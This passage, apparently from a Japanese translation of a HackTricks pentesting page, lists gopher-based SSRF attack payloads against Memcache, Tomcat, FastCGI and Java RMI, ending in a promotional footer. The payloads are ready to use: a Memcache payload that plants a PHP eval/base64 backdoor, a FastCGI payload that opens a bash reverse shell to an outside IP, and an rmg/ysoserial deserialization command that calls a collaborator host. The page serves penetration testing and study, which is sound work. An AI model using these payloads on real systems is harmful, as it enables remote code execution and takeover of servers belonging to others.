* [vBulletin Memcache RCE](https://www.exploit-db.com/exploits/37815)
* [GitHub Enterprise Memcache RCE](https://www.exploit-db.com/exploits/42392)
* [MemcacheのためのGopherペイロードの例](https://blog.safebuff.com/2016/07/03/SSRF-Tips/#SSRF-memcache-Getshell)
```bash
gopher://[target ip]:11211/_%0d%0aset ssrftest 1 0 147%0d%0aa:2:{s:6:"output";a:1:{s:4:"preg";a:2:{s:6:"search";s:5:"/.*/e";s:7:"replace";s:33:"eval(base64_decode($_POST[ccc]));";}}s:13:"rewritestatus";i:1;}%0d%0a
gopher://192.168.10.12:11211/_%0d%0adelete ssrftest%0d%0a
```
## Apache Tomcat

**一般にバインドされるポート: 80,443 (SSL),8080,8443 (SSL)**

Tomcat 6に対して有効:

[gopher-tomcat-deployer](https://github.com/pimps/gopher-tomcat-deployer)

この技術を使用したCTFの解説:

[From XXE to RCE: Pwn2Win CTF 2018 Writeup](https://bookgin.tw/2018/12/04/from-xxe-to-rce-pwn2win-ctf-2018-writeup/)

## FastCGI

**一般にバインドされるポート: 80,443 (SSL)**

これは[ここ](https://blog.chaitin.cn/gopher-attack-surfaces/)から取得されました。
```bash
gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%10%00%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH97%0E%04REQUEST_METHODPOST%09%5BPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Asafe_mode%20%3D%20Off%0Aauto_prepend_file%20%3D%20php%3A//input%0F%13SCRIPT_FILENAME/var/www/html/1.php%0D%01DOCUMENT_ROOT/%01%04%00%01%00%00%00%00%01%05%00%01%00a%07%00%3C%3Fphp%20system%28%27bash%20-i%20%3E%26%20/dev/tcp/172.19.23.228/2333%200%3E%261%27%29%3Bdie%28%27-----0vcdb34oju09b8fd-----%0A%27%29%3B%3F%3E%00%00%00%00%00%00%00
```
## Java RMI

**一般的にバインドされるポート: 1090,1098,1099,1199,4443-4446,8999-9010,9999**

任意のバイト（gopherベース）を許可する盲目のSSRF脆弱性は、Java RMIのデフォルトコンポーネント（RMIレジストリ、分散ガベージコレクタ、アクティベーションシステム）に対してシリアライゼーションまたはコードベース攻撃を実行するために使用できます。詳細な解説は[こちら](https://blog.tneitzel.eu/posts/01-attacking-java-rmi-via-ssrf/)をご覧ください。以下のリストは、ペイロード生成の例を示しています：
```
$ rmg serial 127.0.0.1 1090 CommonsCollections6 'curl example.burpcollaborator.net' --component reg --ssrf --gopher
[+] Creating ysoserial payload... done.
[+]
[+] Attempting deserialization attack on RMI Registry endpoint...
[+]
[+] 	SSRF Payload: gopher://127.0.0.1:1090/_%4a%52%4d%49%00%02%4c%50%ac%ed%00%05%77%22%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%02%44%15%4d[...]
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>
